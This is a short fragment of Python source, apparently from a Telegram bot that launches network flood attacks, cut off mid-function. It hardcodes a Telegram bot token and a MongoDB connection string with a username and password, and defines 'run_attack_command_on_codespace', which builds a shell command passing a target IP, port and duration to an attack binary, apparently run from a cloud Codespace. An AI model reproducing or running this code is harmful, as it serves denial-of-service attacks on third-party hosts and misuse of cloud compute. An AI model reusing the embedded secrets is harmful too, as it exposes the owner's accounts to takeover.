...
TOKEN = '8115351296:AAEXWLZ-rziT9OD5YXHlbif-S6-pEBHDflI'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002250653942
CHANNEL_ID = -1002250653942
error_channel_id = -1002250653942
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./vof {target_ip} {target_port} {duration} 50"
    try:
